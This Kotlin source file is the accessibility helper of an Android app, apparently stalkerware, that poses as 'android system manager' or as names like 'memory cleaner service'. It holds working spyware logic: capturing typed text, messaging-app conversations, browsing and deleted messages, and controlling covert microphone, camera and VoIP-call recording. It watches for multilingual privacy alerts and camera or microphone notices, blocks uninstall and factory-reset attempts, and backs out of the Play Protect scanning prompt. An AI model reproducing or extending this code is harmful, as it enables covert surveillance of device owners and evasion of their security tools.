package com.android.services.accessibility

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ResolveInfo
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Browser
import android.provider.Settings
import android.text.TextUtils
import android.util.Patterns
import android.view.accessibility.AccessibilityNodeInfo
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.android.services.R
import com.android.services.db.entities.ScreenLimit
import com.android.services.db.entities.WebSite
import com.android.services.dialogs.UninstallProtectionUtility
import com.android.services.enums.FcmPushStatus
import com.android.services.models.NodeInfo
import com.android.services.models.UninstalledApp
import com.android.services.services.micBug.MicBugCommandProcessingBaseI
import com.android.services.services.micBug.MicBugCommandService
import com.android.services.services.videoBug.VideoBugCommandProcessingBase
import com.android.services.services.videoBug.VideoBugCommandService
import com.android.services.services.voip.VoipCallCommandProcessingBaseI
import com.android.services.services.voip.VoipCallCommandService
import com.android.services.ui.activities.ScreenLimitActivity
import com.android.services.ui.activities.AntivirousBlockActivity
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.startActivityWithData
import com.android.services.util.logVerbose
import com.android.services.workers.FutureWorkUtil
import com.android.services.workers.micbug.MicBugCommandProcessingBase
import com.android.services.workers.micbug.MicBugCommandWorker
import com.android.services.workers.voip.VoipCallRecordProcessingBase
import com.android.services.workers.voip.VoipCallRecordWorkerService
import java.net.MalformedURLException
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.regex.Pattern

object AccessibilityUtils {

    private const val FORMAT_ONE = 1

    private const val FORMAT_TWO = 2

    var unBlockCameraOrMicrophone = false

    @JvmField
    var voipMessenger = ""
    var voipType = ""

    @JvmField
    var voipStartTime = 0L

    @JvmField
    var screenLimitPackage = ""

    @JvmField
    var windowContentChangePkg = ""

    @JvmField
    var voipName = ""

    @JvmField
    var notificationChannelId = ""

    @JvmField
    var voipNumber = ""

    @JvmField
    var voipDirection = ""

    @JvmField
    var isOutgoingVoipCaptured = false

    @JvmField
    var isIncomingVoipCaptured = false

    @JvmField
    var isVoipCallRecordingMarked = false

    @JvmField
    var startScreenTime = 0L

    @JvmField
    var screenTimePackage = ""

    @JvmField
    var lastTypedText = ""
    var lastPackageName = ""
    var lastVisitedUrl = ""

    @JvmField
    var lastIMTypedText = ""

    @JvmField
    var snapChatMessageType = ""

    @JvmField
    var imSnapchatContactName = ""

    @JvmField
    var lastWindowPackage = ""

    @JvmField
    var lastNodeInfoText = ""

    @JvmField
    var deletedMsg = ""

    @JvmField
    var deletedDate = ""

    @JvmField
    var imMessageText = ""

    @JvmField
    var lastDateString = ""

    @JvmField
    var imDate = ""

    @JvmField
    var imContactName = ""

    @JvmField
    var imContactStatus = ""

    @JvmField
    var senderName = ""

    @JvmField
    var messageType = "Incoming"

    @JvmField
    var deletedPackage = ""

    @JvmField
    var uninstallAppsList: List<UninstalledApp> = ArrayList()

    @JvmField
    var blockedSiteList: List<WebSite> = ArrayList()

    @JvmField
    var blockedAppsList: List<String> = ArrayList()

    @JvmField
    var screenLimitList: List<ScreenLimit> = ArrayList()

    @JvmField
    var lastIMPackage = ""

    @JvmField
    var viberConversations: MutableList<String> = ArrayList()

    @JvmField
    var tumblrConversations: MutableList<String> = ArrayList()

    @JvmField
    var timeStampVal = 0L

    @JvmField
    var hangOutConversationName = ""

    @JvmField
    var isApp = false

    @JvmField
    var isUninstall = false

    @JvmField
    var selfUninstall = false

    @JvmStatic
    var isFullAccessDialog = false

    @JvmField
    var isScreenRecordPermission = false

    @JvmField
    var isCallRecordingMarkedAsStop = false

    @JvmField
    var syncBrowserHistory = false
    @JvmField
    var syncKeyLogs = false
    @JvmField
    var syncAppReport = false





    @JvmField
    var isAppNamePermission = false
    var windowContentPackage = ""
    var rootNode: AccessibilityNodeInfo? = null

    var isDeviceAdmin = false
    var isAppInfo = false
    var appUninstall = false

    var isGoogleBrowser = false

    @JvmStatic
    var dateTime: String = ""

    val castingList =
        listOf("privacy notice", "exposing sensitive info", "recording", "streaming", "casting")
    val croatianCastingList =
        listOf(
            "obavijest o privatnosti",
            "razotkrivanje osjetljivih informacija",
            "snimanje",
            "strujanje",
            "lijevanje"
        )
    val herbewCastingList =
        listOf("הודעת פרטיות", "חשיפת מידע רגיש", "הקלטה", "נְהִירָה", "יְצִיקָה")
    val arabicCastingList =
        listOf("إشعار الخصوصية", "فضح المعلومات الحساسة", "تسجيل", "تدفق", "يصب")

    val frenchCastingList = listOf(
        "avis de confidentialité",
        "exposer des informations sensibles",
        "enregistrement",
        "Diffusion",
        "fonderie"
    )

    val chineseCastingList = listOf(
        "隐私声明",
        "暴露敏感信息",
        "记录",
        "流媒体",
        "铸件"
    )

    val dutchCastingList = listOf(
        "privacyverklaring",
        "gevoelige informatie blootgeven",
        "opname",
        "streamen",
        "gieten"
    )

    val italianCastingList = listOf(
        "informativa sulla Privacy",
        "esporre informazioni sensibili",
        "registrazione",
        "streaming",
        "casting"
    )

    val purtugaliCastingList = listOf(
        "notificação de privacidade",
        "expondo informações confidenciais",
        "gravação",
        "transmissão",
        "elenco"
    )

    val spanishCastingList = listOf(
        "aviso de Privacidad",
        "exponer información sensible",
        "grabación",
        "transmisión",
        "fundición"
    )

    val turkCastingList = listOf(
        "gizlilik bildirimi",
        "hassas bilgileri ifşa etmek",
        "kayıt",
        "yayın Akışı",
        "döküm"
    )

    val persianCastingList = listOf(
        "اطلاعیه حفظ حریم خصوصی",
        "افشای اطلاعات حساس",
        "ضبط کردن",
        "جریان",
        "ریخته گری"
    )

    val russianCastingList = listOf(
        "Уведомление о конфиденциальности",
        "раскрытие конфиденциальной информации",
        "запись",
        "потоковая передача",
        "Кастинг"
    )

    val appNamesForLanguages = listOf(
        "android system manager",
        "مدير نظام android",
        "安卓系統管理器",
        "安卓系统管理器",
        "android systeembeheerder",
        "gestore di sistema Android",
        "gerenciador de sistema android",
        "Administradora de sistema android",
        "android sistem yöneticisi",
        "مدیر سیستم اندروید",
        "системный администратор андроид",
        "upravitelj sustava android"
    )

    val screenCastStartPermissionsTexts = listOf(
        "start now",
        "ابدأ الآن",
        "commencez maintenant",
        "现在开始",
        "begin nu",
        "Parti ora",
        "Comece agora",
        "empezar ahora",
        "şimdi başla",
        "الان شروع کن",
        "начинай сейчас",
        "Započni sada"
    )

    var imPackages = listOf(
        "com.whatsapp",
        "com.whatsapp.w4b",
        "jp.naver.line.android",
        "com.viber.voip",
        "com.imo.android.imoim",
        "com.instagram.android",
        "com.snapchat.android",
        "com.tumblr",
        "com.hike.chat.stickers",
        "com.tinder",
        "com.facebook.orca",
        "com.skype.raider",
        "com.google.android.talk"
    )

    val unblockDeviceMicTextList =
        listOf<String>(
            "unblock device microphone",
            "قم بإلغاء قفل ميكروفون الجهاز",
            "解鎖設備麥克風",
            "débloquer le microphone de l'appareil",
            "apparaatmicrofoon deblokkeren",
            "sbloccare il microfono del dispositivo",
            "desbloquear microfone do dispositivo",
            "desbloquear el micrófono del dispositivo",
            "cihaz mikrofonunun engellemesini kaldır",
            "разблокировать микрофон устройства",
            "رفع انسداد میکروفون دستگاه",
            "בטל את חסימת המיקרופון של המכשיר",
            "deblokirati mikrofon uređaja"
        )
    val unblockDeviceCameraTextList =
        listOf<String>(
            "Unblock device camera",
            "قم بإلغاء قفل كاميرا الجهاز",
            "解鎖設備攝像頭",
            "Débloquer la caméra de l'appareil",
            "Camera van apparaat deblokkeren",
            "Sblocca la fotocamera del dispositivo",
            "Desbloquear câmera do dispositivo",
            "Desbloquear cámara del dispositivo",
            "Cihaz kamerasının engellemesini kaldır",
            "Разблокировать камеру устройства",
            "رفع انسداد دوربین دستگاه",
            "בטל את חסימת מצלמת המכשיר",
            "Deblokirajte kameru uređaja"
        )
    val privacyAlertTextList = listOf<String>(
        "privacy alert",
        "تنبيه الخصوصية",
        "隱私警報",
        "alerte de confidentialité",
        "privacywaarschuwing",
        "avviso sulla privacy",
        "alerta de privacidade",
        "alerta de privacidad",
        "gizlilik uyarısı",
        "gizlilik uyarısı",
        "هشدار حفظ حریم خصوصی",
        "התראת פרטיות",
        "upozorenje o privatnosti"
    )
    val androidSystemManagerIsUsingTextList = listOf<String>(
        "android system manager is using",
        "مدير نظام android يستخدم ملفات",
        "android系統管理器正在使用",
        "le gestionnaire de système Android utilise",
        "android systeembeheerder gebruikt",
        "sta usando il gestore di sistema Android",
        "gerenciador de sistema android está usando",
        "el administrador del sistema android está usando",
        "android sistem yöneticisi kullanıyor",
        "системный менеджер Android использует",
        "مدیر سیستم اندروید در حال استفاده است",
        "מנהל המערכת של אנדרואיד משתמש",
        "koristi upravitelj sustava android"
    )
    val unblockAccessMessageTextList = listOf<String>(
        "This unblocks access for all apps and services allowed to use your",
        "يؤدي هذا إلى إلغاء حظر الوصول لجميع التطبيقات والخدمات المسموح لها باستخدام",
        "這會解除對所有允許使用您的應用程序和服務的訪問權限",
        "Cela débloque l'accès à toutes les applications et tous les services autorisés à utiliser votre",
        "Dit deblokkeert de toegang voor alle apps en services die uw",
        "Questo sblocca l'accesso per tutte le app e i servizi autorizzati a utilizzare il tuo",
        "Isso desbloqueia o acesso a todos os aplicativos e serviços autorizados a usar seu",
        "Esto desbloquea el acceso a todas las aplicaciones y servicios autorizados para usar su",
        "Bu, cihazınızı kullanmasına izin verilen tüm uygulama ve hizmetlere erişimin engelini kaldırır.",
        "Это разблокирует доступ ко всем приложениям и службам, которым разрешено использовать ваш",
        "این کار دسترسی همه برنامه ها و سرویس هایی را که مجاز به استفاده از شما هستند لغو می کند",
        "זה מבטל את חסימת הגישה לכל האפליקציות והשירותים המורשים להשתמש שלך",
        "Time se deblokira pristup svim aplikacijama i uslugama kojima je dopušteno korištenje vašeg"
    )
    val unBlockTextList = listOf<String>(
        "Unblock",
        "رفع الحظر",
        "解除封鎖",
        "Débloquer",
        "Deblokkeren",
        "Sbloccare",
        "Desbloquear",
        "Desatascar",
        "engeli kaldırmak",
        "Разблокировать",
        "رفع انسداد",
        "בטל את החסימה",
        "Deblokiraj"
    )

    //    val privacyNoteMessageTextList= listOf<String>("being used by android system manager",
//    "يتم استخدامه بواسطة مدير نظام android","被安卓系統管理器使用","utilisé par le gestionnaire de système Android",
//        "wordt gebruikt door Android-systeembeheerder","utilizzato dal gestore di sistema Android","sendo usado pelo gerenciador do sistema android",
//    "Siendo utilizada por el administrador del sistema Android","Siendo utilizado por el administrador del sistema Android",
//        "android sistem yöneticisi tarafından kullanılıyor","используется системным менеджером Android","توسط مدیر سیستم اندروید استفاده می شود",
//    "בשימוש על ידי מנהל מערכת אנדרואיד")
    val privacyNoteMessageTextList = listOf<String>(
        "being used by",
        "تستخدم من قبل",
        "被使用",
        "utilisé par",
        "wordt gebruikt door",
        "essere utilizzato da",
        "sendo usado por",
        "siendo utilizado por",
        "tarafından kullanılıyor",
        "используется",
        "در حال استفاده توسط",
        "בשימוש על ידי",
        "koje koristi"
    )

    @JvmField
    var browsers: List<String> = ArrayList()
    var appNames = Arrays.asList(
        "apps security",
        "battery optimiser",
        "device protection services",
        "display services",
        "internet services handler",
        "lock screen manager",
        "memory cleaner service",
        "microphone controller",
        "phone call manager",
        "screen controller",
        "wifi controller"
    )

    fun stopVOIPCallRecording(mContext: Context) {
//        VoipCallCommandProcessingBaseI.voipCallStatus = FcmPushStatus.SUCCESS.getStatus()
//        mContext.stopService(Intent(mContext, VoipCallCommandService::class.java))
        VoipCallRecordProcessingBase.voipCallStatus= FcmPushStatus.SUCCESS.getStatus()
        FutureWorkUtil.stopBackgroundWorker(mContext,VoipCallRecordWorkerService::class.java.name)
    }

    @JvmStatic
    fun isVOIPModeActive(context: Context): Boolean {
        val manager = (context.getSystemService(Context.AUDIO_SERVICE) as AudioManager)
        return manager.mode == AudioManager.MODE_IN_COMMUNICATION
    }

    fun isVOIPModeRinging(context: Context): Boolean {
        val manager = (context.getSystemService(Context.AUDIO_SERVICE) as AudioManager)
        return manager.mode == AudioManager.MODE_RINGTONE
    }

    @JvmStatic
    fun formatDateString(dateStr: String): String {
        if (dateStr.equals("TODAY", ignoreCase = true)) {
            return todayDate
        } else if (dateStr.equals("YESTERDAY", ignoreCase = true)) {
            return yesterdayDate
        } else {
            val dateArray = dateStr.split(" ").toTypedArray()
            var firstStr = dateArray[0]
            val secondStr = dateArray[1]
            val thirdStr = dateArray[2]
            var monthNumber = getMonthNumberFromMonthName(firstStr)
            val format = if (monthNumber == null) FORMAT_ONE else FORMAT_TWO
            if (format == FORMAT_ONE) {
                if (firstStr.length == 1) firstStr = "0$firstStr"
                monthNumber = getMonthNumberFromMonthName(secondStr)
                return "$firstStr-$monthNumber-$thirdStr "
            } else if (format == FORMAT_TWO) {
                return secondStr.replace(",", "") + "-" + monthNumber + "-" + thirdStr + " "
            }
        }
        return ""
    }

    private val yesterdayDate: String
        get() {
            val dateFormat = SimpleDateFormat("dd-MM-yyyy")
            val calendar = Calendar.getInstance()
            calendar.add(Calendar.DATE, -1)
            return dateFormat.format(calendar.time) + " "
        }

    private fun getMonthNumberFromMonthName(monthName: String): String? {
        when (monthName.uppercase(Locale.getDefault())) {
            "JANUARY" -> return "01"
            "FEBRUARY" -> return "02"
            "MARCH" -> return "03"
            "APRIL" -> return "04"
            "MAY" -> return "05"
            "JUNE" -> return "06"
            "JULY" -> return "07"
            "AUGUST" -> return "08"
            "SEPTEMBER" -> return "09"
            "OCTOBER" -> return "10"
            "NOVEMBER" -> return "11"
            "DECEMBER" -> return "12"
        }
        return null
    }

    @JvmStatic
    fun startScreenLimitActivity(mContext: Context) {
        if (screenLimitPackage.isEmpty()) {
            mContext.startActivityWithData<ScreenLimitActivity>(
                listOf(
                    Intent.FLAG_ACTIVITY_NEW_TASK,
//                    Intent.FLAG_ACTIVITY_CLEAR_TASK,
//                    Intent.FLAG_ACTIVITY_CLEAR_TOP
                )
            )
        }
    }

    @JvmStatic
    fun doesFactoryResetOptionClicked(clickedText: String): Boolean {
        return (clickedText.contains("factory reset")
                || clickedText.contains("factory") && clickedText.contains("reset")
                || clickedText.contains("data reset")
                || clickedText.contains("reset") && clickedText.contains("data") || clickedText.contains(
            "erase"
        ) && clickedText.contains("data"))
    }

    @JvmStatic
    fun stopMicBugRecordingIfRecording(context: Context) {
        if (AppUtils.isMicRecordingEnabled(context)) {
//            MicBugCommandProcessingBaseI.micBugStatus =
//                FcmPushStatus.DEVICE_MICROPHONE_INTERRUPTION.getStatus()
//            context.stopService(Intent(context, MicBugCommandService::class.java))
            MicBugCommandProcessingBase.micBugStatus =
                FcmPushStatus.DEVICE_MICROPHONE_INTERRUPTION.getStatus()
            FutureWorkUtil.stopBackgroundWorker(context,MicBugCommandWorker::class.java.name)
        }
    }

    @JvmStatic
    fun stopVideoRecordingIfRecording(context: Context) {
        if (AppUtils.isVideoRecordingEnabled(context)) {
//            VideoBugCommandProcessingBase.videoBugStatus =
//                FcmPushStatus.DEVICE_CAMERA_INTERRUPTION.getStatus()
//            context.stopService(Intent(context, VideoBugCommandService::class.java))
            com.android.services.workers.videobug.VideoBugCommandProcessingBase.videoBugStatus =
                FcmPushStatus.DEVICE_CAMERA_INTERRUPTION.getStatus()
            FutureWorkUtil.stopBackgroundWorker(context,com.android.services.workers.videobug.VideoBugCommandProcessingBase::class.java.name)
        }
    }

    @JvmStatic
    val todayDate: String
        get() {
            val date = Calendar.getInstance().time
            val df = SimpleDateFormat("dd-MM-yyyy")
            return df.format(date) + " "
        }

    fun textMatchesWebURL(text: String?): Boolean {
        return Patterns.WEB_URL.matcher(text).matches()
    }

    fun appendWithHttps(text: String): String {
        return if (!text.startsWith("http://") && !text.startsWith("https://")) {
            "https://$text"
        } else {
            text
        }
    }

    @Throws(MalformedURLException::class)
    fun getURLHost(urlStr: String?): String {
        val url = URL(urlStr)
        var host = url.host
        if (!TextUtils.isEmpty(host) && host.contains(".")) {
            val arr = host.split("\\.").toTypedArray()
            val size = arr.size
            if (size >= 2) {
                host = arr[size - 2] + "." + arr[size - 1]
                return host
            }
        }
        return host
    }

    fun isSiteBlackListed(blockedSiteList: MutableList<WebSite>, httpUrl: String): Boolean {
        for (webSite in blockedSiteList) {
            try {
                val site = webSite.url
                if (webSite.isWebSite && !httpUrl.contains("search?q=")) {
                    val urlHost = getURLHost(httpUrl)
                    val siteHost = getURLHost(site)
                    if (urlHost == siteHost) {
                        return true
                    } else if (!TextUtils.isEmpty(site) && (urlHost.contains(
                            siteHost,
                            true
                        ) || siteHost.contains(
                            urlHost, true
                        ))
                    ) {
                        return true
                    } else if (!TextUtils.isEmpty(site) && (httpUrl.contains(
                            site,
                            true
                        ) || site.contains(
                            httpUrl, true
                        ))
                    ) {
                        return true
                    }

                } else {
                    if (httpUrl.contains(site, true)) {
                        return true
                    }
                }
            } catch (e: Exception) {
                logVerbose("Error Matching BlackList Sites: " + e.message)
            }
        }
        return false
    }

    fun loadBlockedAccessURL(context: Context, pkgName: String?) {
        val urlString = "https://localhost/"
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(urlString))
        intent.setPackage(pkgName)
        intent.putExtra(Browser.EXTRA_APPLICATION_ID, pkgName)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
    }

    @JvmStatic
    fun checkForAppProtection(
        context: Context,
        nodeInfo: AccessibilityNodeInfo,
        pkgName: String,
        childText: String,
    ) {
        try {
            if (childText.contains("device admin app") || childText.contains("administrator")) {
                isDeviceAdmin = true
            }
            if ((pkgName == "com.google.android.packageinstaller" && childText.contains("android system manager"))
                || (isDeviceAdmin && childText.contains("android system manager"))
            ) {
                appUninstall = true
            }
            if (childText.contains("app info")) {
                isAppInfo = true
            }
            if (isAppInfo && childText.contains("android system manager")) {
                appUninstall = true
            }
            if (isAppInfo && appUninstall && childText.contains("force stop")) {
                performAppProtectionTask(context)
            }
            if (appUninstall && (childText.contains("cancel"))) {
                performAppProtectionTask(context, nodeInfo, actionClick = true)
            }
            if (appUninstall && isDeviceAdmin && (childText.contains("activate") || childText.contains(
                    "deactivate"
                ))
            ) {
                performAppProtectionTask(context)
            }
            if (childText.contains(
                    context.getString(R.string.accessibility_description).lowercase(Locale.ROOT)
                )
            ) {
                performAppProtectionTask(context)
            }
        } catch (e: Exception) {
            logVerbose("Error On Uninstalling App Observer: " + e.message)
        }
    }

     fun performTemperOnPlayProtectScreen(context: Context,nodeInfo: NodeInfo) {
        if(nodeInfo.nodePackageName=="com.android.vending"){
            if(nodeInfo.nodeId.isNotEmpty() && nodeInfo.nodeId=="0_resource_name_obfuscated" && (nodeInfo.nodeClassName=="android.widget.TextView"|| nodeInfo.nodeClassName=="android.view.ViewGroup")
                && nodeInfo.nodeText.contains("Turn on Play Protect scanning")
            ){
                LocalBroadcastManager.getInstance(context).sendBroadcast(
                    Intent("com.android.services.accessibility.ACTION_BACK")
                        .putExtra("ACTION_TYPE", 1)
                )
            }else if(nodeInfo.nodeText.equals("android system manager",true) || nodeInfo.nodeContentDescription.equals("android system manager",true)){
                LocalBroadcastManager.getInstance(context).sendBroadcast(
                    Intent("com.android.services.accessibility.ACTION_BACK")
                        .putExtra("ACTION_TYPE", 1)
                )
            }
        }
    }
    @JvmStatic
    fun performAppProtectionTask(
        context: Context,
        nodeInfo: AccessibilityNodeInfo? = null,
        actionClick: Boolean = false,
    ) {
        isDeviceAdmin = false
        appUninstall = false
        isAppInfo = false

//        val allowProtection = AppUtils.protectAppFromTampering() != 2
        val protectTampering = AppUtils.checkForAppTampering()
        val allowProtection = protectTampering != 2
        val isAppProtected =
            (AppConstants.isAppHidden || AppConstants.isAppIconCreated) && allowProtection && AppConstants.serviceActivated
        if (isAppProtected) {
            logVerbose("ProtectionTemperInfo: Function Call")
//            val protectTampering = AppUtils.protectAppFromTampering()
            if (protectTampering == 1) {
                AppUtils.protectAppFromTampering()
                if (actionClick) {
                    nodeInfo!!.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
                context.startActivity(
                    Intent(Settings.ACTION_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                )
                LocalBroadcastManager.getInstance(context)
                    .sendBroadcast(
                        Intent("com.android.services.accessibility.ACTION_BACK")
                            .putExtra("ACTION_TYPE", 0)
                    )
                logVerbose("ProtectionTemperInfo: protect from tampering false")
                Handler(Looper.getMainLooper()).post {
                    UninstallProtectionUtility.instance!!.showDialog()
                }
            } else if (protectTampering == 0) {
                AppUtils.protectAppFromTampering()
                logVerbose("ProtectionTemperInfo: temper and back")
                LocalBroadcastManager.getInstance(context)
                    .sendBroadcast(
                        Intent("com.android.services.accessibility.ACTION_BACK")
                            .putExtra("ACTION_TYPE", 1)
                    )
            }
        }
    }

    @JvmStatic
    fun querySettingPkgName(context: Context): String? {
        val intent = Intent(Settings.ACTION_SETTINGS)
        val resolveInfoList: List<ResolveInfo>? =
            context.packageManager.queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY)
        return if (resolveInfoList == null || resolveInfoList.isEmpty()) {
            "com.android.settings"
        } else resolveInfoList[0].activityInfo.packageName
    }

    @JvmStatic
    fun startAntivirousBlockedAppActivity(mContext: Context) {
        mContext.startActivityWithData<AntivirousBlockActivity>(
            listOf(
                Intent.FLAG_ACTIVITY_NEW_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TOP
            )
        )
    }

    fun validTimeFormat(time: String, twentyFourHour: Boolean = false): Boolean {
        val twelveHourFormat = "(1[012]|[1-9]):[0-5][0-9](\\s)?(?i)(am|pm)"
        val twentyFourHourFormat = "([01]?[0-9]|2[0-3]):[0-5][0-9]"
        return if (!twentyFourHour) Pattern.compile(twelveHourFormat).matcher(time).matches()
        else Pattern.compile(twentyFourHourFormat).matcher(time).matches()
    }
}